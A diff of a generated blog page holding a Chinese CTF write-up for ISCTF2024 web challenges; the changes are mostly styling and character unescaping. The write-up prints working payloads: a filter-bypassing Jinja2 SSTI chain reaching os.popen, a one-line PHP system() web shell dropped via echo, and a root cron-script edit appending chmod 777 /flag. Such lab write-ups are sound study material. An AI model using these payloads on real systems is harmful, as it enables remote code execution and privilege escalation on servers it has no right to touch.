@@ -184,7 +184,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #03a9f4">
+                <a href="/tags/Web/" style="color: #00a596">
                     Web
                 </a>
             </span>
@@ -195,15 +195,15 @@
     
     <div class="content" v-pre>
         <h1 id="wp-for-isctf2024"><a href="#wp-for-isctf2024" class="headerlink" title="wp for isctf2024"></a>wp for isctf2024</h1><h3 id="125时晓山瑞希生日会"><a href="#1-25时晓山瑞希生日会" class="headerlink" title="1.25时晓山瑞希生日会"></a>1.25时晓山瑞希生日会</h3><p>&emsp;&emsp;签到题，考察http请求头相关知识，首先修改user-agent为Project Sekai，再修改X-Forwarded-For为127.0.0.1，最后设置时间为Date: Sun, 27 Aug 2024 05:00:00 GMT。</p>
-<h3 id="2小蓝鲨的冒险"><a href="#2-小蓝鲨的冒险" class="headerlink" title="2.小蓝鲨的冒险"></a>2.小蓝鲨的冒险</h3><p>&emsp;&emsp;签到题，考察php各种特性。先利用<span style="font-family:'Cascadia Code';color:#6faf9f">@parse_str($b);</span>语句，传入<span style="font-family:'Cascadia Code';color:#6faf9f">b&#x3D;a[0]&#x3D;MMHUWUV</span>满足第一个条件。再post将num设为03750(8进制2024)。最后设定which为flag即可。</p>
+<h3 id="2小蓝鲨的冒险"><a href="#2-小蓝鲨的冒险" class="headerlink" title="2.小蓝鲨的冒险"></a>2.小蓝鲨的冒险</h3><p>&emsp;&emsp;签到题，考察php各种特性。先利用<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">@parse_str($b);</span>语句，传入<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">b&#x3D;a[0]&#x3D;MMHUWUV</span>满足第一个条件。再post将num设为03750(8进制2024)。最后设定which为flag即可。</p>
 <h3 id="3ezssti"><a href="#3-ezssti" class="headerlink" title="3.ezssti"></a>3.ezssti</h3><p>&emsp;&emsp;PYssti,对于我来说算是新题。这里直接给出payload</p>
-<pre><code class="POST_data">user_input=\&#123;\&#123;&#39;&#39;|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|
+<pre><code class="POST_data">user_input=&#123;&#123;''|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|
 attr(request.values.name4)(137)|attr (request.values.name5)|attr(request.values.name6)|
-attr(request.values.name7)(&#39;popen&#39;)(request.values.rce)|attr(request.values.name8)()\&#125;\&#125;
-&amp;name1=\_\_class\_\_&amp;name2=\_\_base\_\_&amp;name3=\_\_subclasses\_\_&amp;name4=pop&amp;name5=\_\_init\_\_
-&amp;name6=\_\_globals\_\_&amp;name7=get&amp;rce=cat /flag&amp;name8=read
+attr(request.values.name7)('popen')(request.values.rce)|attr(request.values.name8)()&#125;&#125;
+&amp;name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=__init__
+&amp;name6=__globals__&amp;name7=get&amp;rce=cat /flag&amp;name8=read
 </code></pre>
-<p>&emsp;&emsp;利用<span style="font-family:'Cascadia Code';color:#6faf9f">|attr(request.values.namex)</span>的形式绕过_和[]的过滤，利用__class__.__base__来获取字符串类的基类，再用__subclasses__来获取其子类，在里边找到可以利用的类，这里是os._wrap_close类，用pop给他弹出来(拿到)，然后得到他的globals属性用popen执行rce，再read出来。</p>
+<p>&emsp;&emsp;利用<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">|attr(request.values.namex)</span>的形式绕过_和[]的过滤，利用__class__.__base__来获取字符串类的基类，再用__subclasses__来获取其子类，在里边找到可以利用的类，这里是os._wrap_close类，用pop给他弹出来(拿到)，然后得到他的globals属性用popen执行rce，再read出来。</p>
 <h3 id="4upuploader"><a href="#4-UP-UPloader！" class="headerlink" title="4.UP!UPloader！"></a>4.UP!UPloader！</h3><p>&emsp;&emsp;文件包含题，上传一个马来rce就行。难点(<em>当然，对于我而言&#x1F634;</em>)在于想到通过include.php中包含文件的机制，通过phpfilter伪协议来获取其他php的源码，只要获得源码，就能知晓其文件上传的。拿到shell之后还要点经验，因为flag不是存在文件里的，而是存在环境里的，要用env命令调出来。<br>两个考点:</p>
 <ul>
 <li>灵活运用各种伪代码，不能太套路化</li>
@@ -212,7 +212,7 @@ attr(request.values.name7)(&#39;popen&#39;)(request.values.rce)|attr(request.val
 <blockquote>
 <p>经验丰富的重要性就体现出来了,所以要多多做题呀。</p>
 </blockquote>
-<h3 id="51z_php"><a href="#5-1z-php" class="headerlink" title="5.1z_php"></a>5.1z_php</h3><p>&emsp;&emsp;rce题(说真的，几乎每题都是rce了)。源码给了，过滤了<span style="font-family:'Cascadia Code';color:#6faf9f">[‘cat’, ‘tac’, ‘head’, ‘nl’, ‘more’, ‘less’, ‘tail’, ‘vi’, ‘sed’, ‘od’]</span>这些个命令。只要<span style="font-family:'Cascadia Code';color:#6faf9f">J&#x3D;echo ‘&lt;?php @system($_GET[“x”]); ?&gt;‘ &gt; a.php</span>就可以打一个马进去，然后就好办了。</p>
+<h3 id="51z_php"><a href="#5-1z-php" class="headerlink" title="5.1z_php"></a>5.1z_php</h3><p>&emsp;&emsp;rce题(说真的，几乎每题都是rce了)。源码给了，过滤了<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">[‘cat’, ‘tac’, ‘head’, ‘nl’, ‘more’, ‘less’, ‘tail’, ‘vi’, ‘sed’, ‘od’]</span>这些个命令。只要<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">J&#x3D;echo ‘&lt;?php @system($_GET[“x”]); ?&gt;‘ &gt; a.php</span>就可以打一个马进去，然后就好办了。</p>
 <blockquote>
 <p>不过也可以用其他一些读文件的命令，详细参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12431?time__1311=GqGxRQ0%3DqWwxlrzG7bGOIGCIYKGK%3DN3x">这里.</a><br>其实这样更快呢，可能rce题做的多了，就一直rce了…</p>
 </blockquote>
@@ -386,7 +386,7 @@ echo urlencode(serialize($a));
 <h3 id="10小蓝鲨的临时存储室"><a href="#10-小蓝鲨的临时存储室" class="headerlink" title="10.小蓝鲨的临时存储室"></a>10.小蓝鲨的临时存储室</h3><p>&emsp;&emsp;rce题，于我而言也是认识linux很多东西的好题一道。打个马很容易，但是进了靶机文件目录，准备cat flag的时候才发现不成，一看权限，只有root可读可改，那其实这题给我误导到提权好久，感谢mufeng05大佬的指导，才知道没那么麻烦&#x1FAE1;<br>&emsp;&emsp;最主要是要意识到这个定时发生的sh（所以web手要对一些动态的反应敏感些呢），它会定时删去我们上传的php文件，所以我们把马打进去运行shell的时候，经常会出现404，这就是这个.sh文件搞的鬼。当然，我们也可以利用它。它就在根目录里:</p>
 <pre><code>#!/bin/bash find /var/www/localhost/htdocs/uploads/ -type f -name &quot;*.php&quot; -exec rm -f &#123;&#125; \;
 </code></pre>
-<p>&emsp;&emsp;执行<span style="font-family:'Cascadia Code';color:#6faf9f">ls -l &#x2F;down_file.sh</span>,发现我们对他是有修改权限的。从内容看到它是使用bin&#x2F;bash的，具有root权限，那么我们就可以追加修改&#x2F;flag的权限了.<br>最后的pl如下:</p>
+<p>&emsp;&emsp;执行<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">ls -l &#x2F;down_file.sh</span>,发现我们对他是有修改权限的。从内容看到它是使用bin&#x2F;bash的，具有root权限，那么我们就可以追加修改&#x2F;flag的权限了.<br>最后的pl如下:</p>
 <pre><code class="GET_data">x=echo &quot;chmod 777 /flag;&quot; &gt;&gt;/down_file.sh
 </code></pre>
 <p>&emsp;&emsp;然后就畅通无阻啦~</p>
